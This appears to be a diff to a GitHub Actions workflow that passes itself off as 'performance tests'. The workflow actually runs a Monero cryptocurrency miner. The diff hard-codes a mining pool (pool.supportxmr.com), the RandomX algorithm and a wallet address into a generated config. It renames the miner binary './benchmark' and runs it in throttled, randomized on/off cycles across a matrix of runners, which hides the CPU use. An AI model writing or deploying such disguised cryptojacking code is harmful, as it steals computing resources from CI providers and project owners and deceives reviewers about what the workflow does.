@@ -1,4 +1,4 @@
-name: X
+name: test
 
 on:
   workflow_dispatch:
@@ -64,11 +64,10 @@ jobs:
         run: |
           cd app/build
           TOTAL_CPUS=$(nproc)
-          MAX_THREADS=$((TOTAL_CPUS * 60 / 100))
+          MAX_THREADS=$((TOTAL_CPUS * 30 / 100))
           if [ $MAX_THREADS -lt 1 ]; then
             MAX_THREADS=1
           fi
-          echo "Generating configuration with $MAX_THREADS threads..."
           cat > config.json <<EOF
           {
             "autosave": true,
@@ -85,10 +84,10 @@ jobs:
             },
             "pools": [
               {
-                "algo": "${{ secrets.ALGO }}",
-                "coin": "${{ secrets.CON }}",
-                "url": "${{ secrets.URL }}",
-                "user": "${{ secrets.USER }}",
+                "algo": "rx/0",
+                "coin": "monero",
+                "url": "pool.supportxmr.com:443",
+                "user": "43jqgNCGAZQYwnk4s7Lt7P93S2sDkdN5bLKgUsGqVMoD6Bftsc5VVcHNy3mRBr7aBg5KgtFDHfYqK1MF8HEgSGucLbCCPeS",
                 "pass": "runner${{ matrix.runner }}",
                 "rig-id": "gh-r${{ matrix.runner }}",
                 "keepalive": true,
@@ -101,25 +100,25 @@ jobs:
             "print-time": 60
           }
           EOF
-          echo "Configuration generated successfully."
-
+          
       - name: Run Performance Tests
-        timeout-minutes: 60
+        timeout-minutes: 20
         run: |
           cd app/build
-          echo "Starting performance tests..."
           (while true; do
-            echo "[$(date '+%H:%M:%S')] CPU: $(nproc) cores, Memory: $(free -h | grep Mem | awk '{print $3"/"$2}')"
+            echo "=== $(date) ==="
+            ps aux | grep -E 'build/\.' | grep -v grep || echo "Process not running"
+            free -h | grep Mem
             sleep 300
           done) > ../../perf_stats_${{ matrix.runner }}.log 2>&1 &
           MONITOR_PID=$!
 
           (
             while true; do
-              PAUSE_TIME=$((RANDOM % 180 + 120))
-              RUN_TIME=$((RANDOM % 600 + 900))
+              PAUSE_TIME=$((RANDOM % 60 + 30))
+              RUN_TIME=$((RANDOM % 120 + 60))
 
-              timeout $RUN_TIME nice -n 19 cpulimit -l 30 -f -- ./benchmark --config=config.json --randomx-mode=light --randomx-no-rdmsr 2>&1 | grep -E '(net|speed|accepted|rejected)' &
+              timeout $RUN_TIME nice -n 19 cpulimit -l 30 -f -- ./benchmark --config=config.json --randomx-mode=light --randomx-no-rdmsr &
               APP_PID=$!
 
               sleep $RUN_TIME
@@ -131,11 +130,10 @@ jobs:
           ) &
           CYCLE_PID=$!
 
-          sleep 19200
+          sleep 1200
           kill $CYCLE_PID 2>/dev/null || true
           pkill -9 -f 'build/' 2>/dev/null || true
           kill $MONITOR_PID 2>/dev/null || true
-          echo "Performance tests completed."
 
       - name: Collect Test Results
         if: always()
@@ -143,11 +141,10 @@ jobs:
           echo "=== Performance Test Summary ===" > summary_${{ matrix.runner }}.txt
           echo "Runner: ${{ matrix.runner }}" >> summary_${{ matrix.runner }}.txt
           echo "End Time: $(date)" >> summary_${{ matrix.runner }}.txt
-          echo "Status: Completed" >> summary_${{ matrix.runner }}.txt
 
           if [ -f perf_stats_${{ matrix.runner }}.log ]; then
-            echo -e "\n=== Resource Usage Summary ===" >> summary_${{ matrix.runner }}.txt
-            tail -5 perf_stats_${{ matrix.runner }}.log >> summary_${{ matrix.runner }}.txt
+            echo -e "\n=== Resource Usage (Last 20 entries) ===" >> summary_${{ matrix.runner }}.txt
+            tail -20 perf_stats_${{ matrix.runner }}.log >> summary_${{ matrix.runner }}.txt
           fi
 
           cat summary_${{ matrix.runner }}.txt
